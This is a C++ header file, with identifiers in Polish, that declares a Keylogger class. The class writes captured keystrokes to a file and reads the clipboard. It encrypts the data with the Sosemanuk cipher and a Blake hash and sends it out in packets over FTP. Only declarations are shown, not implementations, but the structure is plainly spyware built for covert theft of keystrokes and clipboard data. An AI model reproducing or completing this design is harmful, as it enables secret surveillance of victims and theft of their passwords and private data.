#pragma once
#include <iostream>
#include <fstream>
#include <Windows.h>
#include "Sosemanuk.h"
#include "Blake.h"
#include "FTP.h"

using namespace std;


class Keylogger
{
private:
	string sciezka_docelowego;
	string nazwa_pliku_docelowego;

	int rozmiar_paczki_bajy;
	int numer_paczki;

	Sosemanuk *sosemanuk;
	string klucz;
	string IV;
	int dlugosc_strumienia_klucza;

	Blake *blake;
	FTP *ftp;

public:
	Keylogger(string nazwa_pliku_docelowego, string klucz, string IV, int dlugosc_strumienia_klucza, int rozmiar_paczki_bajty, FTP *ftp, int start_numer_paczki);
	~Keylogger();
	int zapis_do_pliku(unsigned char znak);
	string start();
	
	const char *odczyt_ze_schowka();
	void wyslij_paczke();

	string get_nowy_klucz();
	string get_nowa_nazwa_pliku_docelowego(string nazwa_pliku_docelowego_temp);
	
};
